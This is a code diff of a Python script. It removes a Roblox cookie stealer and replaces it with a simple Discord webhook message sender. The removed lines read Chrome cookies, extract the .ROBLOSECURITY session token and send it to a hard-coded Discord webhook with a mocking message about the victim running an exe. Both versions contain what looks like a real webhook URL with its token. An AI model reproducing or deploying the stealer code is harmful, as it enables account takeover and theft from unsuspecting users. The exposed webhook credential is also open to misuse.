@@ -1,20 +1,19 @@
 import requests
-import threading
-import browser_cookie3 as cookie
-from discord_webhook import DiscordWebhook, DiscordEmbed
 
-webhook_urls = ['https://discord.com/api/webhooks/1412339726417006592/vhnSS2XVIYTAtaNMjO2jCp_Plg4fixjjKwzFy6J1wknomLMG2fZl9uHw42lH1lJyld1w', 'webhook url 2']
+# Replace this with your webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1412339726417006592/vhnSS2XVIYTAtaNMjO2jCp_Plg4fixjjKwzFy6J1wknomLMG2fZl9uHw42lH1lJyld1w"
 
-def getCookiesFromPc():
-    req = requests.Session()
-    cj = cookie.chrome()
-    req.cookies = cj
-    r = req.get("https://www.roblox.com/")
-    for c in req.cookies:
-        if c.name == ".ROBLOSECURITY":
-            webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1412339726417006592/vhnSS2XVIYTAtaNMjO2jCp_Plg4fixjjKwzFy6J1wknomLMG2fZl9uHw42lH1lJyld1w', content="@everyone")
-            embed = DiscordEmbed(title='Cookie Found of braindead person!', description='He clicked a exe!', color=242424)
-            embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
-            embed.set_timestamp('
-            webhook.add_embed(embed)
-            response = webhook.execute()
+def send_message(content: str):
+    data = {
+        "content": content
+    }
+    response = requests.post(WEBHOOK_URL, json=data)
+    
+    if response.status_code == 204:
+        print("Message sent successfully!")
+    else:
+        print(f"Failed to send message: {response.status_code}")
+        print(response.text)
+
+# Example usage
+send_message("Hello from my Python test script! 🚀")
